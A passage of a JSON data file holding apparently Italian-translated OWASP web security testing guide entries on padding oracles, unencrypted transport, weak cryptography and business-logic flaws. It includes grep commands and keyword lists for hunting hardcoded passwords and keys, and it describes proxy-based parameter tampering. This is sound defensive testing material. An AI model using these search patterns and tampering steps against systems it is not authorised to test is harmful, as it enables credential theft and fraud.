blocco (l'IV è memorizzato sul server o l'applicazione usa una cattiva pratica di IV statico), devono essere eseguiti vari bit flip a turno. Un approccio alternativo potrebbe essere anteporre un blocco casuale e variare l'ultimo byte di tale blocco (0-255).</p><p>I test e il valore base dovrebbero almeno causare tre stati diversi durante e dopo la decifratura:</p><ul><li>Il testo cifrato viene decifrato e i dati risultanti sono corretti.</li><li>Il testo cifrato viene decifrato ma i dati risultanti sono corrotti e causano un'eccezione o gestione di errore nella logica applicativa.</li><li>La decifratura fallisce a causa di errori di padding.</li></ul><p>Confronta attentamente le risposte. Cerca in particolare eccezioni e messaggi che indichino problemi di padding. Se compaiono tali messaggi, l'applicazione contiene un padding oracle. Se i tre stati sopra descritti sono osservabili in modo implicito (diversi messaggi di errore, canali temporali), è altamente probabile la presenza di un padding oracle. Prova a eseguire l'attacco padding oracle per averne conferma.</p><ul><li>ASP.NET lancia System.Security.Cryptography.CryptographicException: Padding is invalid and cannot be removed se il padding di un testo cifrato decifrato è errato.</li><li>In Java viene lanciata javax.crypto.BadPaddingException in questo caso.</li><li>Errori di decifratura o simili possono essere padding oracle.</li></ul><p>Un'implementazione sicura controllerà l'integrità e fornirà solo due risposte: ok e failed. Non devono esserci canali laterali utilizzabili per determinare stati di errore interni.</p><p>Verifica che tutti i punti in cui dati cifrati dal client (che dovrebbero essere conosciuti solo dal server) vengono decifrati, soddisfino queste condizioni:</p><p>Visualizzazione del processo di decifratura</p>",
      "tools": "<h3>Strumenti</h3><ul><li>Bletchley</li><li>PadBuster</li><li>Poracle</li><li>python-paddingoracle</li></ul><h3>Riferimenti</h3><ul><li>Wikipedia - Padding Oracle Attack</li><li>Juliano Rizzo, Thai Duong, “Practical Padding Oracle Attacks”</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CRYP-03": {
      "summary": "<h3>Riassunto</h3><p>I dati sensibili devono essere protetti durante la trasmissione sulla rete. Se i dati vengono trasmessi tramite HTTPS o con altri metodi di cifratura, il meccanismo di protezione non deve presentare limiti o vulnerabilità, come spiegato nell'articolo Testing for Weak Transport Layer Security e in altra documentazione OWASP:</p><ul><li>OWASP Top 10 2017 A3-Sensitive Data Exposure.</li><li>OWASP ASVS - Verification V9.</li><li>Transport Layer Protection Cheat Sheet.</li></ul><p>Come regola generale, se un dato deve essere protetto a riposo, deve esserlo anche durante la trasmissione. Alcuni esempi di dati sensibili sono:</p><ul><li>Informazioni usate per l’autenticazione (es. credenziali, PIN, identificativi di sessione, token, cookie…)</li><li>Informazioni protette da leggi, regolamenti o policy aziendali (es. carte di credito, dati clienti)</li></ul><p>Se l’applicazione trasmette informazioni sensibili tramite canali non cifrati, come HTTP, è considerato un rischio di sicurezza. Un attaccante può impossessarsi degli account intercettando il traffico di rete. Alcuni esempi sono autenticazione Basic che invia le credenziali in chiaro tramite HTTP, moduli di login che trasmettono le credenziali tramite HTTP, o trasmissione in chiaro di altre informazioni sensibili per legge, regolamenti o logiche di business.</p><p>Esempi di dati identificativi personali (PII):</p><ul><li>Numeri di previdenza sociale</li><li>Numeri di conto corrente</li><li>Informazioni su passaporti</li><li>Informazioni sanitarie</li><li>Dati su assicurazioni mediche</li><li>Dati di studenti</li><li>Numeri di carte di credito e debito</li><li>Patenti di guida e documenti di identità</li></ul><h3>Obiettivi del test</h3><ul><li>Identificare informazioni sensibili trasmesse attraverso i vari canali.</li><li>Valutare la privacy e la sicurezza dei canali utilizzati.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Diversi tipi di informazioni che devono essere protette potrebbero essere trasmesse dall’applicazione in chiaro. Per verificare se queste informazioni vengono trasmesse via HTTP invece che HTTPS, cattura il traffico tra client e server web che richiede credenziali. Per ogni messaggio contenente dati sensibili, verifica che la trasmissione avvenga tramite HTTPS. Consulta la documentazione OWASP Top 10 2017 A3-Sensitive Data Exposure o il Transport Layer Protection Cheat Sheet per maggiori dettagli.</p><p>Un esempio tipico è l’uso di autenticazione Basic tramite HTTP. Con questa modalità le credenziali utente sono codificate (ma non cifrate) e inviate negli header HTTP. Nell’esempio sotto, l’applicazione usa autenticazione Basic e HTTP invece di HTTPS.</p><pre><code>$ curl -kis http://example.com/restricted/\nHTTP/1.1 401 Authorization Required\nDate: Fri, 01 Aug 2013 00:00:00 GMT\nWWW-Authenticate: Basic realm = \"Restricted Area\"\n...\n<body bgcolor = white> <h1>401 Authorization Required</h1>  Invalid login credentials!  </body></html></code></pre><p>Un altro esempio tipico sono i moduli di autenticazione che trasmettono credenziali tramite HTTP. Nell’esempio seguente si vede HTTP nell’attributo action del form. Questo problema si può individuare anche intercettando il traffico HTTP con un proxy.</p><pre><code><form action=\"http://example.com/login\"> <label for=\"username\">User:</label> <input type=\"text\" id=\"username\" name=\"username\" /> <label for=\"password\">Password:</label> <input type=\"password\" id=\"password\" name=\"password\" /> <input type=\"submit\" value=\"Login\" /> </form></code></pre><p>I cookie di sessione devono essere trasmessi tramite canali protetti. Se il cookie non ha il flag Secure, può essere trasmesso in chiaro. Nell’esempio sotto il cookie viene impostato senza il flag Secure e tutto il processo di login avviene tramite HTTP.</p><pre><code>https://secure.example.com/login POST /login HTTP/1.1 Host: secure.example.com ... Set-Cookie: JSESSIONID=...; httponly ... Location: private/ ... http://example.com/private GET /private HTTP/1.1 Host: example.com ... Cookie: JSESSIONID=...; ...</code></pre><p>Se la web app consente all’utente di cambiare account o chiamare servizi diversi con le credenziali, verifica che tutte queste interazioni usino HTTPS. Tra le interazioni da testare:</p><ul><li>Moduli per gestione password dimenticata o altre credenziali</li><li>Moduli per la modifica delle credenziali</li><li>Moduli che richiedono autenticazione con altri provider (es. pagamenti online)</li></ul><p>Puoi usare queste tecniche per individuare informazioni sensibili:</p><p>Verificare se password o chiavi di cifratura sono hardcoded nel codice sorgente o nei file di configurazione.</p><p>grep -r -E \"Pass|password|pwd|user|guest|admin|encry|key|decrypt|sharekey\" ./PathToSearch/</p><p>Verificare se log o sorgenti contengono numeri di telefono, email, ID o altri dati PII. Adatta la regex in base al formato del PII.</p><p>grep -r \" {2\\}[0-9]\\{6\\} \"  ./PathToSearch/</p>",
      "tools": "<h3>Strumenti</h3><ul><li>curl</li><li>grep</li><li>Wireshark</li><li>TCPDUMP</li></ul><h3>Riferimenti</h3><ul><li>OWASP Insecure Transport</li><li>OWASP HTTP Strict Transport Security Cheat Sheet</li><li>Let’s Encrypt</li></ul>",
      "remediation": "<h3>Rimedi</h3><p>Utilizza HTTPS per tutto il sito e reindirizza ogni richiesta HTTP verso HTTPS.</p>",
      "test_objectives": ""
    },
    "WSTG-CRYP-04": {
      "summary": "<h3>Riassunto</h3><p>L’uso scorretto degli algoritmi di cifratura può portare all’esposizione di dati sensibili, perdita delle chiavi, autenticazione debole, sessioni insicure e attacchi di spoofing. Esistono algoritmi di cifratura o hash noti per essere deboli e da evitare, come MD5 e RC4.</p><p>Oltre alla scelta di algoritmi sicuri, è fondamentale configurare correttamente anche i parametri di cifratura. Ad esempio, la modalità ECB (Electronic Code Book) generalmente non deve essere utilizzata.</p><h3>Obiettivi del test</h3><ul><li>Fornire linee guida per identificare utilizzi o implementazioni deboli di cifratura o hashing.</li></ul>",
      "how-to": "<h3>Come testare</h3><ul><li>Quando si utilizza AES128 o AES256, l’IV (Initialization Vector) deve essere casuale e imprevedibile. Vedi FIPS 140-2, sezione 4.9.1 sui generatori di numeri casuali. In Java, <code>java.util.Random</code> è considerato debole, mentre <code>java.security.SecureRandom</code> è preferibile.</li><li>Per la cifratura asimmetrica, usa ECC (Elliptic Curve Cryptography) con curve sicure (es. Curve25519). Se non è possibile usare ECC, preferisci RSA con chiave di almeno 2048 bit.</li><li>Per la firma con RSA, è consigliato l’uso di padding PSS.</li><li>Non usare algoritmi deboli come MD5, RC4, DES, Blowfish, SHA1, RSA/DSA 1024 bit, ECDSA 160 bit, 2TDEA 80/112 bit.</li><li>Requisiti minimi di lunghezza chiave:</li></ul><pre><code>Scambio chiavi: Diffie–Hellman minimo 2048 bit\nIntegrità messaggio: HMAC-SHA2\nHash messaggio: SHA2 256 bit\nCifratura asimmetrica: RSA 2048 bit\nCifratura simmetrica: AES 128 bit\nHashing password: PBKDF2, Scrypt, Bcrypt\nECDH, ECDSA: 256 bit</code></pre><ul><li>Evita SSH in modalità CBC e, per la cifratura simmetrica, la modalità ECB.</li><li>Quando usi PBKDF2 per l’hashing delle password, il parametro di iterazione dovrebbe superare 10.000 (NIST raccomanda almeno 10.000 iterazioni). MD5 è vietato come funzione di hash con PBKDF2.</li></ul><ul><li>Cerca nel codice chiavi di algoritmi deboli: MD4, MD5, RC4, RC2, DES, Blowfish, SHA-1, ECB.</li><li>Per implementazioni Java, controlla le API di cifratura e i parametri. Ad esempio:</li></ul><pre><code>SecretKeyFactory ( ... )\nSecretKeySpec ( ... )\nCipher c = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");</code></pre><ul><li>Per RSA, i padding consigliati sono:</li></ul><pre><code>RSA/ECB/OAEPWithSHA-1AndMGF1Padding (2048)\nRSA/ECB/OAEPWithSHA-256AndMGF1Padding (2048)</code></pre><ul><li>Evita l’uso di ECB e verifica che l’IV sia sempre diverso e casuale per ogni cifratura.</li></ul><pre><code>// Usa un IV diverso per ogni cifratura\nbyte[] newIv = ...;\ns = new GCMParameterSpec(s.getTLen(), newIv);\ncipher.init(..., s);</code></pre><ul><li>Verifica che <code>IvParameterSpec</code> sia inizializzato con byte generati casualmente.</li></ul><pre><code>IvParameterSpec iv = new IvParameterSpec(randBytes);\nSecretKeySpec skey = new SecretKeySpec(key.getBytes(), \"AES\");\nCipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\ncipher.init(Cipher.ENCRYPT_MODE, skey, iv);</code></pre><ul><li>In Java, cerca <code>MessageDigest</code> per verificare se vengono usati algoritmi deboli (MD5, CRC).</li></ul><pre><code>MessageDigest md5 = MessageDigest.getInstance(\"MD5\");</code></pre><ul><li>Per le firme digitali, non usare SHA1 o MD5. Ad esempio:</li></ul><pre><code>Signature sig = Signature.getInstance(\"SHA1withRSA\");</code></pre><ul><li>Cerca <code>PBKDF2</code>: per generare hash sicuri per le password, verifica parametri e iterazioni.</li></ul><p>Le iterazioni devono essere oltre 10.000 e il valore del salt generato casualmente.</p><pre><code>private static byte[] pbkdf2(char[] password, byte[] salt, int iterations, int bytes) throws NoSuchAlgorithmException, InvalidKeySpecException {\n  PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, bytes * 8);\n  SecretKeyFactory skf = SecretKeyFactory.getInstance(PBKDF2_ALGORITHM);\n  return skf.generateSecret(spec).getEncoded();\n}</code></pre><ul><li>Informazioni sensibili hardcoded:</li></ul><pre><code>Parole chiave utente: name, root, su, sudo, admin, superuser, login, username, uid\nParole chiave chiavi: public key, AK, SK, secret key, private key, passwd, password, pwd, share key, shared key, crypto, base64\nAltre parole chiave comuni: sysadmin, root, privilege, pass, key, code, master, admin, uname, session, token, Oauth, privatekey, shared secret</code></pre>",
      "tools": "<h3>Strumenti</h3><ul><li>Scanner di vulnerabilità come Nessus, NMAP (scripts) o OpenVAS per identificare protocolli e cifrature deboli su SNMP, TLS, SSH, SMTP, ecc.</li><li>Strumenti di code analysis come klocwork, Fortify, Coverity, CheckMark per la revisione del codice.</li></ul><pre><code>CWE-261: Weak Cryptography for Passwords\nCWE-323: Reusing a Nonce, Key Pair in Encryption\nCWE-326: Inadequate Encryption Strength\nCWE-327: Use of a Broken or Risky Cryptographic Algorithm\nCWE-328: Reversible One-Way Hash\nCWE-329: Not Using a Random IV with CBC Mode\nCWE-330: Use of Insufficiently Random Values\nCWE-347: Improper Verification of Cryptographic Signature\nCWE-354: Improper Validation of Integrity Check Value\nCWE-547: Use of Hard-coded, Security-relevant Constants\nCWE-780: Use of RSA Algorithm without OAEP</code></pre><h3>Riferimenti</h3><ul><li>NIST FIPS Standards</li><li>Wikipedia: Initialization Vector</li><li>Secure Coding - Generating Strong Random Numbers</li><li>Optimal Asymmetric Encryption Padding</li><li>Cryptographic Storage Cheat Sheet</li><li>Password Storage Cheat Sheet</li><li>Secure Coding - Do not use insecure or weak cryptographic algorithms</li><li>Insecure Randomness</li><li>Insufficient Entropy</li><li>Insufficient Session-ID Length</li><li>Using a broken or risky cryptographic algorithm</li><li>Javax.crypto.cipher API</li><li>ISO 18033-1:2015 – Encryption Algorithms</li><li>ISO 18033-2:2015 – Asymmetric Ciphers</li><li>ISO 18033-3:2015 – Block Ciphers</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-BUSL-01": {
      "summary": "<h3>Summary</h3><p>L’applicazione deve garantire che solo dati logicamente validi possano essere inseriti sia dal frontend che direttamente lato server. Verificare solo i dati lato client/front-end può lasciare l’app vulnerabile a iniezioni tramite proxy o nel passaggio verso altri sistemi. A differenza di una semplice Boundary Value Analysis (BVA), qui si tratta di logica più complessa che spesso non può essere verificata solo all’ingresso, ma richiede controlli anche in altri sistemi.</p><p>Esempio: Un’applicazione potrebbe richiedere il codice fiscale. In un BVA, si verifica che il dato abbia il formato giusto (lunghezza, caratteri ammessi, etc.), ma la logica applicativa va oltre: la persona risulta su una black-list? Proviene da una determinata area geografica? Queste sono considerazioni di business logic.</p><p>Le vulnerabilità legate alla validazione logica dei dati sono specifiche per ogni applicazione e si differenziano dai rischi relativi alla sola modifica del workflow perché riguardano proprio la coerenza logica dei dati, non solo la rottura della sequenza delle azioni.</p><p>Sia il frontend che il backend devono validare che i dati gestiti e inoltrati siano logicamente corretti. Anche dati formalmente validi possono essere trattati diversamente dalla business logic a seconda del contesto o delle circostanze.</p><p>Esempio pratico: gestisci un sito e-commerce multi-livello per la vendita di moquette. L’utente seleziona il prodotto, inserisce la misura, paga e il frontend verifica che tutto sia formalmente corretto. Ma la logica business sul backend prevede due percorsi: se il prodotto è in magazzino lo spedisce direttamente, altrimenti delega la spedizione a un partner. Un attaccante potrebbe manipolare la transazione e spedirla al partner senza pagamento, oppure segnalare fittiziamente la merce come esaurita per forzare la logica su un percorso anomalo.</p><p>Altri esempi: sistemi di carta di credito che si aggiornano solo una volta al giorno potrebbero permettere di superare i limiti di spesa sfruttando differenze tra saldo reale e quello visibile in giornata; campagne DDo$ che sfruttano errori nella gestione delle transazioni bancarie, come inviare piccole somme ripetutamente per generare costi superiori alle donazioni stesse.</p><h3>Test Objectives</h3><ul><li>Identificare i punti di iniezione dei dati.</li><li>Verificare che tutti i controlli avvengano lato backend e che non siano aggirabili.</li><li>Tentare di rompere il formato dei dati attesi e analizzare il comportamento dell’applicazione.</li></ul>",
      "how-to": "<h3>How to Test</h3><ul><li>Analizza la documentazione del progetto ed esegui test esplorativi per trovare punti di inserimento dati o di passaggio tra sistemi.</li><li>Prova a inserire dati logicamente non validi nell’applicazione/sistema.</li><li>Esegui test funzionali GUI per verificare che solo valori “validi” siano accettati.</li><li>Utilizza un proxy per osservare POST/GET HTTP e cerca variabili come costo o quantità, con particolare attenzione ai passaggi di mano tra sistemi che possono essere punti di iniezione o manipolazione.</li><li>Una volta individuate le variabili, prova a inserire dati logicamente “non validi” (ad esempio, codici identificativi inesistenti, numeri di sicurezza sociale fuori standard, ecc.) e verifica che il server non li accetti e gestisca correttamente l’errore.</li></ul><h3>Related Test Cases</h3><ul><li>Tutti i casi di test sull’Input Validation.</li><li>Test su Account Enumeration e Account Guessing.</li><li>Test per aggirare la gestione delle sessioni.</li><li>Test su variabili di sessione esposte.</li></ul>",
      "tools": "<h3>Tools</h3><ul><li>Zed Attack Proxy (ZAP)</li><li>Burp Suite</li></ul><h3>References</h3><ul><li>OWASP Proactive Controls (C5) - Validate All Inputs</li><li>OWASP Cheat Sheet Series - Input_Validation_Cheat_Sheet</li></ul>",
      "remediation": "<h3>Remediation</h3><p>L’applicazione/sistema deve accettare solo dati “logicamene validi” in tutti i punti di input e nei passaggi tra sistemi, senza fidarsi ciecamente di dati già entrati nel sistema.</p>",
      "test_objectives": ""
    },
    "WSTG-BUSL-02": {
      "summary": "<h3>Summary</h3><p>La manipolazione delle richieste è una tecnica in cui gli attaccanti aggirano il frontend dell’applicazione per inviare direttamente dati al backend, con valori che la logica di business non si aspetta o non protegge. Gli attaccanti usano proxy per inviare richieste HTTP POST/GET con dati non supportati, sfruttando parametri prevedibili o esponendo funzionalità “nascoste” utili in fase di sviluppo (debug, schermate speciali, ecc.).</p><p>Le vulnerabilità legate alla possibilità di forzare richieste sono specifiche per ogni applicazione e si differenziano dalla validazione logica dei dati, in quanto qui il focus è interrompere il flusso di business logic.</p><p>L’applicazione deve implementare controlli che impediscano l’accettazione di richieste forgiate, che potrebbero essere sfruttate per aggirare processi o flussi applicativi. L’attaccante usa un proxy per manipolare i parametri e indurre l’applicazione a ritenere valido un processo che non è mai avvenuto.</p><p>Esempio: un sito di vendita biglietti consente uno sconto una sola volta tramite un campo nascosto (1/0). L’attaccante intercetta il campo via proxy e ne forza il valore per applicare più volte lo sconto.</p><p>Altro esempio: un videogioco che assegna punti o moltiplicatori in base ai livelli. Un attaccante può trovare un campo nascosto per attivare modalità sviluppo (debug) e accumulare punti o premi in modo illecito.</p><h3>Test Objectives</h3><ul><li>Analizza la documentazione del progetto per individuare parametri prevedibili o funzionalità nascoste.</li><li>Inserisci dati logicamente validi, ma in modo da bypassare la logica di business normale.</li></ul>",
      "how-to": "<h3>How to Test</h3><ul><li>Usa un proxy per osservare le richieste POST/GET HTTP cercando valori che variano regolarmente o sono facilmente prevedibili.</li><li>Se trovi parametri prevedibili, modifica il valore per ottenere comportamenti inaspettati.</li></ul><ul><li>Cerca campi nascosti (debug, modalità sviluppo) che possono essere attivati tramite proxy.</li><li>Prova a modificarli per vedere se ottieni risposte o comportamenti diversi dall’applicazione.</li></ul><h3>Related Test Cases</h3><ul><li>Test su variabili di sessione esposte</li><li>Test su CSRF</li><li>Test su Account Enumeration e Account Guessing</li></ul>",
      "tools": "<h3>Tools</h3><ul><li>Zed Attack Proxy (ZAP)</li><li>Burp Suite</li></ul><h3>References</h3><ul><li>Easter egg</li><li>Top 10 Software Easter Eggs</li></ul>",
      "remediation": "<h3>Remediation</h3><p>L’applicazione deve essere progettata per impedire che un attaccante possa prevedere e manipolare parametri per sovvertire la logica di business, o sfruttare funzionalità nascoste/non documentate (debug, etc.).</p>",
      "test_objectives": ""
    },
    "WSTG-BUSL-03": {
      "summary": "<h3>Summary</h3><p>Molte applicazioni mostrano campi diversi in base all’utente o al contesto lasciando alcuni input nascosti, ma spesso è possibile inviare comunque valori di questi campi tramite proxy. In questi casi, il backend deve essere sufficientemente intelligente da eseguire controlli relazionali/server-side e garantire che solo i dati ammessi siano processati.</p><p>L’applicazione non deve mai basarsi su controlli non editabili, menu a tendina o campi nascosti per la business logic, poiché questi possono essere facilmente manipolati lato client con tool di proxy. Se la logica dipende da valori esposti come non editabili, bisogna gestirli sempre lato server.</p><p>Inoltre, oltre ai dati di sistema, anche i log devono essere protetti contro lettura, scrittura e manipolazioni non autorizzate.</p><p>Esempio: in una webapp, solo l’admin può cambiare la password di altri utenti, e vede i relativi campi. Se un utente non admin invia tramite proxy quei campi, potrebbe ingannare il server facendogli credere di essere un admin.</p><p>Altro esempio: menu a tendina con progetti assegnati, ma un utente malintenzionato invia tramite proxy l’ID di un progetto a cui non ha accesso, rischiando di saltare i controlli di autorizzazione.</p><p>Altri casi: sistemi della motorizzazione che consentono agli impiegati di aggiornare i dati dopo verifica, ma in modalità online permettono ai cittadini di modificare dati tramite proxy compromettendo l’integrità dei dati, oppure log di sistema manipolabili da utenti non autorizzati.</p><h3>Test Objectives</h3><ul><li>Analizza la documentazione del progetto per individuare componenti che muovono, archiviano o gestiscono dati.</li><li>Stabilisci quali dati sono accettabili per ciascun componente e quali devono essere protetti.</li><li>Verifica chi è autorizzato a modificare o leggere ciascun dato.</li><li>Prova a inserire, aggiornare o eliminare dati in modo non consentito dalla logica di business.</li></ul>",
      "how-to": "<h3>How to Test</h3><ul><li>Usa un proxy per catturare il traffico HTTP e cerca campi nascosti.</li><li>Se li trovi, confronta i valori col frontend e prova a inviarne di diversi tramite proxy, tentando di aggirare la business logic.</li></ul><ul><li>Cerca punti dove puoi inserire dati in aree non editabili dal frontend.</li><li>Se li trovi, prova a manipolare i valori tramite proxy per testare l’efficacia dei controlli server-side.</li></ul><ul><li>Elenca i componenti che possono essere impattati, come log o database.</li><li>Prova a leggere, modificare o eliminare le informazioni di ciascun componente identificato, ad esempio cercando di manipolare log file.</li></ul><h3>Related Test Cases</h3><p>Tutti i casi di test su Input Validation.</p>",
      "tools": "<h3>Tools</h3><ul><li>Editor e tool di manipolazione file/sistema</li><li>Zed Attack Proxy (ZAP)</li><li>Burp Suite</li></ul><h3>References</h3><ul><li>Implementazione dell’integrità referenziale e business logic condivisa su RDB</li><li>Regole e vincoli di integrità nei DB</li><li>Gestione integrità referenziale su Oracle</li><li>Riutilizzo della business logic con Reactive Logic</li></ul>",
      "remediation": "<h3>Remediation</h3><p>L’applicazione deve applicare controlli di accesso stringenti su chi può modificare/leggere i dati e tramite canali sicuri che ne garantiscano l’integrità. È fondamentale implementare un logging corretto e monitorare per prevenire accessi/modifiche non autorizzate.</p>",
      "test_objectives": ""
    },
    "WSTG-BUSL-04": {
      "summary": "<h3>Summary</h3><p>Gli attaccanti possono raccogliere informazioni monitorando il tempo che l’applicazione impiega per completare certe operazioni. Inoltre, possono manipolare o rompere i flussi di processo semplicemente tenendo aperte sessioni attive e non completando le transazioni nei tempi “previsti”.</p><p>Queste vulnerabilità di timing sono tipicamente manuali e devono essere valutate in base alle specifiche di ciascuna applicazione/sistema.</p><p>La tempistica dei processi può svelare cosa accade “dietro le quinte”. Se l’app consente di dedurre esiti o azioni dalla variazione dei tempi di risposta, un utente può “giocare” col sistema a proprio vantaggio.</p><p>Esempi: una slot machine che impiega più tempo a rispondere prima di una grossa vincita (indizio per puntare di più); un sistema di login che impiega più tempo se l’utente è valido ma la password è errata (esponendo la validità dell’username).</p><p>Altri casi: sistemi di ticketing che bloccano posti per un certo tempo, vulnerabili se un attaccante tiene bloccate prenotazioni senza mai completare l’acquisto; e-commerce che blocca il prezzo al login, esposto se un attaccante completa la transazione solo a prezzo favorevole.</p><h3>Test Objectives</h3><ul><li>Analizza la documentazione per funzioni sensibili al tempo.</li><li>Elabora ed esegui misuse case specifici.</li></ul>",
      "how-to": "<h3>How to Test</h3><p>Il tester deve identificare quali processi dipendono dal tempo (finestre temporali, esecuzione di task, ecc.) che potrebbero consentire di aggirare controlli.</p><p>Conviene automatizzare le richieste per analizzare con precisione le tempistiche, anche se è possibile procedere manualmente.</p><p>Rappresenta il flusso con diagrammi, individua i punti di iniezione, prepara le richieste da inviare nei processi vulnerabili e analizza le differenze di comportamento del sistema rispetto alla logica di business attesa.</p><h3>Related Test Cases</h3><ul><li>Test su attributi dei cookie</li><li>Test su session timeout</li></ul>",
      "tools": "",
      "remediation": "<h3>Remediation</h3><p>Sviluppa le applicazioni considerando la gestione dei tempi: se gli attaccanti possono ottenere un vantaggio osservando le tempistiche, aggiungi ritardi o passi extra affinché tutte le risposte abbiano tempi omogenei.</p><p>Implementa anche meccanismi che invalidino le transazioni che superano il tempo massimo previsto (timeout automatici, cancellazione automatica dopo X minuti, ecc.).</p>",
      "test_objectives": ""
    },
    "WSTG-BUSL-05": {
      "summary": "<h3>Summary</h3><p>Molti problemi gestiti dalle applicazioni richiedono limiti al numero di volte in cui una funzione può essere utilizzata o un’azione eseguita. L’applicazione deve essere “sufficientemente intelligente” da non consentire all’utente di superare il limite previsto, poiché spesso ogni utilizzo comporta un beneficio che deve essere contabilizzato correttamente. Ad esempio: un sito e-commerce può permettere l’utilizzo di uno sconto solo una volta per transazione, oppure una piattaforma in abbonamento può limitare il download di documenti completi a tre al mese.</p><p>Le vulnerabilità legate ai limiti di utilizzo sono specifiche per ciascuna applicazione e richiedono misuse case per tentare di esercitare funzioni oltre il limite consentito.</p><p>Un attaccante potrebbe aggirare la logica di business ed eseguire una funzione più volte del previsto, traendone vantaggio illecito.</p><p>Esempio: dopo aver applicato uno sconto, l’utente naviga di nuovo sulla pagina degli sconti per cercare di applicarne altri o ripetere lo stesso sconto più volte.</p><h3>Test Objectives</h3><ul><li>Individuare funzioni che richiedono limiti al numero di chiamate.</li><li>Verificare se esistono limiti logici e se vengono correttamente applicati.</li></ul>",
      "how-to": "<h3>How to Test</h3><ul><li>Analizza la documentazione e usa test esplorativi per individuare funzionalità o azioni che non dovrebbero essere eseguite più di una volta o oltre un certo numero nel workflow della business logic.</li><li>Per ciascuna funzione individuata, crea misuse case per tentare di eseguirla più volte del consentito (es. navigare avanti e indietro tra le pagine per ripetere la funzione, o caricare e scaricare più volte il carrello per ottenere sconti aggiuntivi).</li></ul><h3>Related Test Cases</h3><ul><li>Testing for Account Enumeration and Guessable User Account</li><li>Testing for Weak lock out mechanism</li></ul>",
      "tools": "",
      "remediation": "<h3>Remediation</h3><p>L’applicazione deve implementare controlli rigidi per prevenire l’abuso dei limiti. Questo si può ottenere rendendo inutilizzabile un coupon a livello database dopo l’uso, impostando un contatore per utente lato backend o database, o identificando ogni utente tramite sessione, secondo quanto richiesto dal business.</p><h3>References</h3><ul><li>Gold Trading Was Temporarily Halted On The CME This Morning</li></ul>",
      "test_objectives": ""
    },
    "WSTG-BUSL-06": {
      "summary": "<h3>Summary</h3><p>Le vulnerabilità di workflow comprendono qualsiasi tipo di vulnerabilità che permetta a un attaccante di utilizzare impropriamente un’applicazione o sistema aggirando (senza seguire) il workflow progettato/inteso.</p><p>Definizione di workflow (Wikipedia): una sequenza di passaggi collegati, ognuno dei quali segue senza ritardi o lacune e termina appena prima dell’inizio del successivo. Il workflow rappresenta un’astrazione del lavoro reale.</p><p>La business logic dell’applicazione deve richiedere all’utente di completare passi specifici nel giusto ordine e, se il flusso viene interrotto, tutte le azioni devono essere annullate o “rollbackate”. Le vulnerabilità relative all’aggiramento dei workflow sono molto specifiche e richiedono misuse case basati su requisiti e use case reali.</p><p>Il processo deve avere controlli per assicurare che le azioni/operazioni dell’utente avvengano nell’ordine corretto e, se una transazione attiva altre azioni, queste vengano annullate se la transazione non va a buon fine.</p><p>Esempio: se un sistema premia i punti fedeltà dopo l’avvio della transazione ma permette all’utente di annullarla dopo aver ottenuto i punti, l’attaccante può accumulare punti senza pagare nulla. Oppure, su un forum, l’utente può inserire un post pulito e poi modificarlo inserendo parole proibite se il controllo avviene solo all’inserimento iniziale e non in fase di modifica.</p><h3>Test Objectives</h3><ul><li>Analizza la documentazione per individuare metodi che consentano di saltare o eseguire passi in ordine diverso da quello previsto.</li><li>Sviluppa misuse case e cerca di aggirare ogni flusso logico identificato.</li></ul>",
      "how-to": "<h3>How to Test</h3><ul><li>Avvia una transazione superando i punti che assegnano crediti/punti all’utente.</li><li>Annulla la transazione o riduci il valore finale per verificare che i punti siano effettivamente aggiornati correttamente.</li></ul><ul><li>Su un CMS o forum, inserisci dati validi e poi prova a modificarli per lasciare dati in uno stato invalido o con valori non ammessi.</li></ul><h3>Related Test Cases</h3><ul><li>Testing Directory Traversal/File Include</li><li>Testing for Bypassing Authorization Schema</li><li>Testing for Bypassing Session Management Schema</li><li>Test Business Logic Data Validation</li><li>Test Ability to Forge Requests</li><li>Test Integrity Checks</li><li>Test for Process Timing</li><li>Test Number of Times a Function Can be Used Limits</li><li>Test Defenses Against Application Mis-use</li><li>Test Upload of Unexpected File Types</li><li>Test Upload of Malicious Files</li></ul>",
      "tools": "",
      "remediation": "<h3>Remediation</h3><p>L’applicazione deve essere “consapevole” e implementare controlli che obblighino gli utenti a completare ogni passo nel corretto ordine, prevenendo tentativi di saltare, ripetere o aggirare fasi del workflow. Il test sulle vulnerabilità di workflow richiede di sviluppare misuse case per verificare se si riesce a completare un processo senza seguire tutti i passi previsti.</p><h3>References</h3><ul><li>OWASP Abuse Case Cheat Sheet</li><li>CWE-840: Business Logic Errors</li></ul>",
      "test_objectives": ""
    },
    "WSTG-BUSL-07": {
      "summary": "<h3>Summary</h3><p>L’abuso o uso improprio di funzionalità legittime può indicare tentativi di enumerazione, identificazione di punti deboli e sfruttamento di vulnerabilità. Occorre verificare se l’applicazione implementa difese attive per proteggersi.</p><p>Se mancano difese attive, un attaccante può cercare vulnerabilità senza rischio di contromisure e il proprietario non si accorge dell’attacco.</p><p>Esempio: un utente autenticato esegue una serie improbabile di azioni, e l’app risponde dopo la quinta azione sospetta disabilitando funzionalità critiche, chiedendo autenticazioni aggiuntive, introducendo ritardi o tracciando maggiormente le richieste. Se ciò non avviene, l’app ha fallito il test.</p><p>In pratica, questi pattern si rilevano spesso tramite fuzzing sui parametri dell’applicazione. Il test richiede di annotare se la webapp mostra difese come:</p><ul><li>Risposte cambiate o richieste bloccate</li><li>Logout o blocco account</li></ul><p>Difese localizzate (es. blocco temporaneo dopo N errori di login, rifiuto di input con caratteri speciali) non sono sufficienti. Servono difese più generali, anche contro:</p><ul><li>Forced browsing</li><li>Bypass input validation</li><li>Accessi disordinati o duplicati, parametri errati</li><li>Input strutturati invalidi (JSON/XML), payload XSS/SQLi evidenti</li><li>Accesso eccessivo/veloce a funzionalità (upload, download, logout...)</li><li>Cambi improvvisi di geolocalizzazione o user-agent</li><li>Accesso a processi multistep fuori ordine</li></ul><p>Le difese funzionano meglio sulle aree protette, ma possono essere utili anche in pubblico (es. blocco massivo creazione account o scraping).</p><p>Se nessuna delle difese sopra viene rilevata, segnalare che l’app non ha difese attive contro abusi. Attenzione: alcune difese possono essere “silenziose” (log, alert, monitoraggio) e non visibili direttamente.</p><h3>Test Objectives</h3><ul><li>Annotare tutte le azioni di test effettuate.</li><li>Verificare quali test portano a funzionalità diverse in presenza di input aggressivo.</li><li>Capire le difese esistenti e se sono adeguate contro 